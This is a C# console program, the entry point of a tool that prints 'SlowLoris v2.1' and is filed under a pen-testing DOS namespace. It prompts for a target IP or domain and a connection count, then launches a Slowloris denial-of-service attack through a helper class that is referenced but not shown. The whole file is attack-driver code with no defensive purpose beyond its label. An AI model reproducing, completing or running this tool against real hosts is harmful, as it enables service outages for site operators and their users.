using System;
using System.Net;
using System.Threading;
using System.Threading.Tasks;

namespace Savaged.PenTesting.DOS
{
    class MainClass
    {
        public static void Main(string[] args)
        {
            Splash();

            Console.ResetColor();
            Console.Write("Enter the target IP or domain: ");
            var input = Console.ReadLine();

            var result = IPAddress.TryParse(input, out IPAddress ip);
            var target = "127.0.0.1";
            if (result)
            {
                target = ip.ToString();
            }
            else
            {
                result = Uri.CheckHostName(input) != 
                    UriHostNameType.Unknown;
                if (result)
                {
                    target = input;
                }
                else
                {
                    Console.WriteLine("Bad IP; defaulting.");
                }
            }

            Console.Write(
                "Enter the number of connections (max {0}): ", 
                SlowLoris.MAX_CONNECTIONS);
            input = Console.ReadLine();

            result = int.TryParse(input, out int connectionCount);
            if (!result ||
                connectionCount < 1 ||
                connectionCount > SlowLoris.MAX_CONNECTIONS)
            {
                Console.WriteLine("Bad count; defaulting.");
                connectionCount = 200;
            }

            Console.Write("Using SSL (y/n): ");
            var key = Console.ReadKey();

            var usingSsl = key.Key == ConsoleKey.Y;            

            var slowLoris = new SlowLoris(target, 80, usingSsl, connectionCount);
            slowLoris.Event += OnSlowLorisEvent;

            Console.WriteLine();
            Console.WriteLine("Starting on {0}.", slowLoris.Connection);
            Console.WriteLine("Press q to quit.");

            using (var cts = new CancellationTokenSource())
            {
                var lorisTask = new Task(() =>
                {
                    slowLoris.Attack(cts.Token);
                });
                lorisTask.Start();

                while (true)
                {
                    key = Console.ReadKey();
                    var quitPressed = key.Key == ConsoleKey.Q;
                    if (quitPressed)
                    {
                        Console.WriteLine();
                        Console.WriteLine("Quitting...");
                        break;
                    }
                }
                slowLoris.Stop();
                cts.Cancel();
            }
            Environment.Exit(0);
        }

        private static void OnSlowLorisEvent(object sender, SlowLorisEventArgs e)
        {
            Console.WriteLine(e);
        }

        private static void Splash()
        {
            Console.WriteLine("CCCCCCCCCCOOCCOOOOO888@8@8888OOOOCCOOO888888888@@@@@@@@@8@8@@@@888OOCooocccc::::");
            Console.WriteLine("CCCCCCCCCCCCCCCOO888@888888OOOCCCOOOO888888888888@88888@@@@@@@888@8OOCCoococc:::");
            Console.WriteLine("CCCCCCCCCCCCCCOO88@@888888OOOOOOOOOO8888888O88888888O8O8OOO8888@88@@8OOCOOOCoc::");
            Console.WriteLine("CCCCooooooCCCO88@@8@88@888OOOOOOO88888888888OOOOOOOOOOCCCCCOOOO888@8888OOOCc::::");
            Console.WriteLine("CooCoCoooCCCO8@88@8888888OOO888888888888888888OOOOCCCooooooooCCOOO8888888Cocooc:");
            Console.WriteLine("ooooooCoCCC88@88888@888OO8888888888888888O8O8888OOCCCooooccccccCOOOO88@888OCoccc");
            Console.WriteLine("ooooCCOO8O888888888@88O8OO88888OO888O8888OOOO88888OCocoococ::ccooCOO8O888888Cooo");
            Console.WriteLine("oCCCCCCO8OOOCCCOO88@88OOOOOO8888O888OOOOOCOO88888O8OOOCooCocc:::coCOOO888888OOCC");
            Console.WriteLine("oCCCCCOOO88OCooCO88@8OOOOOO88O888888OOCCCCoCOOO8888OOOOOOOCoc::::coCOOOO888O88OC");
            Console.WriteLine("oCCCCOO88OOCCCCOO8@@8OOCOOOOO8888888OoocccccoCO8O8OO88OOOOOCc.:ccooCCOOOO88888OO");
            Console.WriteLine("CCCOOOO88OOCCOOO8@888OOCCoooCOO8888Ooc::...::coOO88888O888OOo:cocooCCCCOOOOOO88O");
            Console.WriteLine("CCCOO88888OOCOO8@@888OCcc:::cCOO888Oc..... ....cCOOOOOOOOOOOc.:cooooCCCOOOOOOOOO");
            Console.WriteLine("OOOOOO88888OOOO8@8@8Ooc:.:...cOO8O88c.      .  .coOOO888OOOOCoooooccoCOOOOOCOOOO");
            Console.WriteLine("OOOOO888@8@88888888Oo:. .  ...cO888Oc..          :oOOOOOOOOOCCoocooCoCoCOOOOOOOO");
            Console.WriteLine("COOO888@88888888888Oo:.       .O8888C:  .oCOo.  ...cCCCOOOoooooocccooooooooCCCOO");
            Console.WriteLine("CCCCOO888888O888888Oo. .o8Oo. .cO88Oo:       :. .:..ccoCCCooCooccooccccoooooCCCC");
            Console.WriteLine("coooCCO8@88OO8O888Oo:::... ..  :cO8Oc. . .....  :.  .:ccCoooooccoooocccccooooCCC");
            Console.WriteLine(": ccooooCO888OOOO8OOc..:...::. .co8@8Coc::..  .... ..:cooCooooccccc::::ccooCCooC");
            Console.WriteLine(".:::coocccoO8OOOOOOC:..::....coCO8@8OOCCOc:...  ....:ccoooocccc:::::::::cooooooC");
            Console.WriteLine("....::::ccccoCCOOOOOCc......:oCO8@8@88OCCCoccccc::c::.:oCcc:::cccc:..::::coooooo");
            Console.WriteLine(".......::::::::cCCCCCCoocc:cO888@8888OOOOCOOOCoocc::.:cocc::cc:::...:::coocccccc");
            Console.WriteLine("...........:::..:coCCCCCCCO88OOOO8OOOCCooCCCooccc::::ccc::::::.......:ccocccc:co");
            Console.WriteLine(".............::....:oCCoooooCOOCCOCCCoccococc:::::coc::::....... ...:::cccc:cooo");
            Console.WriteLine(" ..... ............. .coocoooCCoco:::ccccccc:::ccc::..........  ....:::cc::::coC");
            Console.WriteLine("   .  . ...    .... ..  .:cccoCooc:..  ::cccc:::c:.. ......... ......::::c:cccco");
            Console.WriteLine(" .  .. ... ..    .. ..   ..:...:cooc::cccccc:.....  .........  .....::::::ccoocc");
            Console.WriteLine();
            Console.ForegroundColor = ConsoleColor.Yellow;           
            Console.WriteLine(" Welcome to SlowLoris v2.1 ");
            Console.ResetColor();
            Console.WriteLine();
        }
    }

}
